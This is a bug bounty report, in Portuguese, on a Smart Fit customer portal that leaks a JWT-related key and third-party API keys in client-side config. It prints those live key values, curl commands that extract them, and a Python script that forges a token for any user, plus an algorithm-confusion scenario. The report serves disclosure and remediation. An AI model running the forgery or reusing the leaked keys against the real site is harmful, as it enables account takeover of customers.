# SF-001 — `window.__RUNTIME_CONFIG__` JWT Signing Key Exposed Client-Side

**Programa:** BugHunt — Grupo Smart Fit Bug Bounty Público  
**Severidade:** HIGH  
**CVSS:** 7.5 (AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:N)  
**CWE:** CWE-312 — Cleartext Storage of Sensitive Information  
**CWE:** CWE-522 — Insufficiently Protected Credentials  
**Endpoint afetado:** `https://espacodocliente.smartfit.com.br` (todas as páginas)  
**Descoberto:** 2026-07-01  
**Status:** Confirmado — reproduzível sem autenticação

---

## Resumo

O portal do cliente da Smart Fit (`espacodocliente.smartfit.com.br`) injeta um objeto `window.__RUNTIME_CONFIG__` diretamente no HTML de **todas as páginas** (incluindo 404) contendo múltiplas chaves sensíveis sem qualquer proteção. O achado mais crítico é `jwtKeyPublic`, uma string hex de 32 bytes (256 bits) que é exposta client-side e cujo uso como segredo HMAC-SHA256 server-side permitiria a um atacante forjar tokens JWT de qualquer usuário, resultando em Account Takeover.

---

## Evidência

### 1. Extração do `RUNTIME_CONFIG` (reproduzível sem auth)

```bash
curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/v2/login" \
  | grep -o 'window.__RUNTIME_CONFIG__ = {[^<]*'
```

**Resposta:**
```json
{
  "minitokenBaseUrl": "https://mnt.bioritmo.io",
  "minitokenPublicKey": "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxQSCjf6QfsY6qdnand/p\njl89fH4/dcCyMeyT89NE6j/NhF6BAjeq2e/q/vOcgMDax3Xasdmj3w1f38x2BeAx\n[...]\n-----END PUBLIC KEY-----",
  "minitokenV2PublicKey": "pk_lBlw7ZoTcKmhVgUtosaJrLTDvh9TcjtH",
  "jwtKeyPublic": "68dc95441a5b63051680a33fde22ed168d7ad6c32f565c929fac78bfa99a47e8",
  "brazeApiKey": "4a0a6c8c-27bc-486d-a08e-ab144b7d5864",
  "brazeBaseUrl": "sdk.iad-07.braze.com",
  "growthbookClientKey": "sdk-2vF9VYwVKUpq9wVb",
  "mazeApiKey": "3910eb9c-ba14-43b3-8d1b-c3e46695427a"
}
```

### 2. `jwtKeyPublic` exposto em todas as páginas — inclusive 404

```bash
curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/pagina-inexistente" \
  | grep -o '"jwtKeyPublic":"[^"]*"'
# → "jwtKeyPublic":"68dc95441a5b63051680a33fde22ed168d7ad6c32f565c929fac78bfa99a47e8"
```

A chave está presente independentemente da rota — confirmando que é injetada globalmente pelo servidor Next.js.

### 3. Análise da chave `jwtKeyPublic`

- **Tamanho:** 32 bytes (64 hex chars = 256 bits)
- **Formato:** Hex string bruta — NÃO é uma RSA public key (que seria PEM)
- **Compatibilidade:** Tamanho correto para HMAC-SHA256 secret OU ed25519 public key
- **Contexto:** Denominada `jwtKeyPublic` (distinta do `minitokenPublicKey` RSA) — sugere chave para um segundo sistema JWT

**Vetor de exploração — Algorithm Confusion / HMAC Secret Forge:**

Se o servidor utiliza `jwtKeyPublic` como segredo HMAC-SHA256 para emitir/verificar tokens JWT (via `jsonwebtoken`, NextAuth, ou biblioteca similar), um atacante pode:

```python
import base64, json, hashlib, hmac

# Chave extraída do RUNTIME_CONFIG
jwt_key = bytes.fromhex("68dc95441a5b63051680a33fde22ed168d7ad6c32f565c929fac78bfa99a47e8")

def b64url_encode(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Forjar token para qualquer usuário
header  = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "VICTIM_USER_ID", "email": "vitima@email.com", "iat": 1751400000, "exp": 9999999999}

h = b64url_encode(json.dumps(header, separators=(',', ':')))
p = b64url_encode(json.dumps(payload, separators=(',', ':')))
sig = hmac.new(jwt_key, f"{h}.{p}".encode(), hashlib.sha256).digest()
forged_jwt = f"{h}.{p}.{b64url_encode(sig)}"

# → JWT válido se o servidor usar esta mesma chave
print(forged_jwt)
```

**JWT Forjado:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiJWSUNUSU1fVVNFUl9JRCIsImVtYWlsIjoidml0aW1hQGVtYWlsLmNvbSIsImlhdCI6MTc1MTQwMDAwMCwiZXhwIjo5OTk5OTk5OTk5fQ.
[assinatura com jwtKeyPublic como HMAC secret]
```

---

## Dados Sensíveis Adicionais no Config

| Campo | Valor | Risco |
|---|---|---|
| `jwtKeyPublic` | `68dc95441a5b63051680a33fde22ed168d7ad6c32f565c929fac78bfa99a47e8` | ALTO — potencial chave de assinatura JWT |
| `minitokenPublicKey` | RSA 2048-bit public key (PEM) | MÉDIO — public key do serviço de auth `mnt.bioritmo.io` exposta |
| `minitokenV2PublicKey` | `pk_lBlw7ZoTcKmhVgUtosaJrLTDvh9TcjtH` | MÉDIO — publishable key do serviço de minitoken v2 |
| `brazeApiKey` | `4a0a6c8c-27bc-486d-a08e-ab144b7d5864` | BAIXO — SDK key client-side (confirmado inválido para REST API) |
| `mazeApiKey` | `3910eb9c-ba14-43b3-8d1b-c3e46695427a` | MÉDIO — chave da plataforma de pesquisa de usuários (UX Research) |

---

## Impacto

**Cenário 1 — JWT Forgery (Crítico se confirmado):**  
Se `jwtKeyPublic` é usado server-side como segredo HMAC-SHA256:
- Qualquer visitante anônimo pode forjar tokens de autenticação
- Acesso completo ao `/espacodocliente.smartfit.com.br` de qualquer usuário
- Dados expostos: histórico de pagamentos, contratos, dados pessoais, métodos de pagamento, endereços

**Cenário 2 — Algorithm Confusion Attack:**  
O `minitokenPublicKey` (RSA 2048-bit) pode ser usado como segredo HMAC para algoritmo HS256 se o servidor aceitar ambos os algoritmos sem validação estrita do campo `alg` (CVE-2015-9235).

**Cenário 3 — Exposição de Plataformas de Terceiros:**  
- `mazeApiKey`: acesso potencial a sessões de UX research, gravações de tela e dados de participantes de pesquisa
- `growthbookClientKey`: exposição completa de flags de feature (A/B tests e estratégia interna de produto)

---

## Reprodução Passo-a-Passo

1. Acesse sem autenticação: `https://espacodocliente.smartfit.com.br/pt-BR/v2/login`
2. No browser DevTools → Console, execute:
   ```javascript
   console.log(window.__RUNTIME_CONFIG__)
   ```
3. Observe o objeto completo com `jwtKeyPublic`, `brazeApiKey`, `mazeApiKey`, etc.
4. Confirme que a mesma chave aparece em qualquer página (inclusive 404):
   ```bash
   curl -sk "https://espacodocliente.smartfit.com.br/pt-BR/nao-existe" | grep jwtKeyPublic
   ```

---

## Recomendações

1. **Imediato:** Remover `jwtKeyPublic` do `RUNTIME_CONFIG` client-side — chaves de assinatura NUNCA devem ser expostas no front-end
2. **Imediato:** Rotacionar/invalidar todas as chaves expostas: `jwtKeyPublic`, `mazeApiKey`, `brazeApiKey`
3. **Curto prazo:** Separar configuração de servidor (segredos) de configuração de cliente (apenas valores públicos necessários)
4. **Curto prazo:** Verificar se `jwtKeyPublic` é usado server-side como HMAC secret e, se sim, tratar como Account Takeover crítico
5. **Longo prazo:** Implementar Secret Management (AWS Secrets Manager, Vault) para garantir que segredos não sejam injetados em bundles client-side

---

## Referências

- CWE-312: https://cwe.mitre.org/data/definitions/312.html
- CVE-2015-9235 (JWT Algorithm Confusion): https://nvd.nist.gov/vuln/detail/CVE-2015-9235
- OWASP: Sensitive Data Exposure — https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure
